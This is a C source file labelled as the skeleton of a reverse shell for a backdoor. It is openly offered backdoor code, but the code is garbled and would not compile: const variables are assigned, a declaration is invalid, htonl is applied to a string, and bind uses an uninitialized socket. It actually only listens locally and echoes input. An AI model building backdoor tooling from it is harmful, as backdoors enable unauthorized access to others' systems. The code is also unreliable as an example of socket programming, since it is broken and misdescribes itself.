/* reverse shell.c  
a skelleton of reverse shell contained in the backdoor. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>

#define IP "127.0.0.1"

#define PORT 55766

  typedef struct target {

  char * ip;

  int port;

  char cmd[1025]; /* commands receivd from the server */

  int listenfd;

  //socklen_t clien;

  int n;
  /* int persistency;  run a thread function to keep connection aliv */

  } Target;

  int main() {

  Target target;
    
  /* set up the functins */
    
  struct sockaddr_in serv_addr;

  const unsigned int sockfd;
  const unsigned int newsockfd;
  const char cmd;
  const unsigned int listenfd;
 
  int socklen_t clien; 

  const unsigned int n;
  
  /* create connection */  
    
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0)
      perror("error 101");
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
    perror("setsockopt(SO_REUSEADDR) failed");

  memset(&serv_addr, '0', sizeof(serv_addr));
  memset(cmd, '0' , sizeof(cmd));

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = htonl(IP);
  serv_addr.sin_port = htons(PORT);

  bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

  listen(listenfd, 10);

  // printf("about to listen\n");
     listen(sockfd,5);
     clien = sizeof(serv_addr);
    // printf("About to accept\n");

     int i;

     for(i=0; i<100; i++){
         newsockfd = accept(sockfd,
                 (struct sockaddr *) &serv_addr,
                 &clien);

         if (newsockfd < 0)
             error("ERROR on accept");
         bzero(cmd,256);
         n = read(newsockfd,cmd,255);
         if (n < 0) error("ERROR reading from socket");
         printf("Package > %s\n",cmd);
         n = write(newsockfd,"RESPONSE=OK",18);
         if (n < 0) error("ERROR writing to socket");
         close(newsockfd);
     }
     close(sockfd);
     return 0;
}
/* sockfd = socket(AF_INET, SOCK_STREAM, 0);
if (sockfd < 0)
    error("ERROR opening socket");

if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
    error("setsockopt(SO_REUSEADDR) failed"); */
